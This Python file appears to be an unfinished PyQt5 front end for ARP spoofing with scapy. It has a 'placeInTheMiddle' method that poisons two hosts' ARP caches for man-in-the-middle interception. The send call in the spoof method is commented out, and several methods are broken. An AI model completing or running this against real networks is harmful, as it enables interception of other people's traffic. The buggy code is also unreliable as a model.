import scapy.all as scapy
from PyQt5.QtWidgets import QHBoxLayout, QLabel, QLineEdit, QPushButton, QVBoxLayout, QWidget

class ScapySpooferWidget(QWidget):
    def __init__(self, windowManager):
        super().__init__()

        self.windowManager = windowManager

        self.window().setWindowTitle("Spoofer")

        layout = QVBoxLayout(self)

        self.initTargetUI(layout)
        self.initButtonUI(layout)
        self.setLayout(layout)

    def initTargetUI(self, layout):
        firstWidget = QWidget()
        secondWidget = QWidget()
        self.first = QHBoxLayout(firstWidget)
        self.second = QHBoxLayout(secondWidget)
        firstWidget.setLayout(self.first)
        secondWidget.setLayout(self.second)
        
        self.first.ip = QLineEdit()
        self.first.mac = QLineEdit()
        self.second.ip = QLineEdit()
        self.second.mac = QLineEdit()

        self.first.addWidget(self.first.ip)
        self.first.addWidget(self.first.mac)
        self.second.addWidget(self.second.ip)
        self.second.addWidget(self.second.mac)

        layout.addWidget(firstWidget)
        layout.addWidget(secondWidget)

    def initButtonUI(self, layout):
        btnWidget = QWidget()
        buttonLayout = QHBoxLayout(btnWidget)
        btnWidget.setLayout(buttonLayout)
        spoofButton = QPushButton("Spoof")
        resetButton = QPushButton("Reset")
        buttonLayout.addWidget(spoofButton)
        buttonLayout.addWidget(resetButton)
        layout.addWidget(btnWidget)

    def addToSpoof(self, ip, mac, slot):
        print(ip)
        print(mac)
        if (slot == 1):
            self.first.ip.setText(ip)
            self.first.mac.setText(mac)
        else:
            self.second.ip.setText(ip)
            self.second.mac.setText(mac)
    
    def placeInTheMiddle(self):
        self.spoof(self.first, self.second)
        self.spoof(self.second, self.first)

    def spoof(target, fake):
        packet = scapy.ARP(op = 2, pdst = target.ip, hwdst = target.mac, psrc = fake.ip)
        #scapy.send(packet, verbose=False)

    def reset(first, second):
        first_packet = scapy.ARP(op = 2, pdst = first.ip, hwdst = first.mac, psrc = second.ip, hwsrc = second.mac)
        scapy.send(first_packet, verbose=False)
        second_packet = scapy.ARP(op = 2, pdst = second.ip, hwdst = second.mac, psrc = first.ip, hwsrc = first.mac)
        scapy.send(second_packet, verbose=False)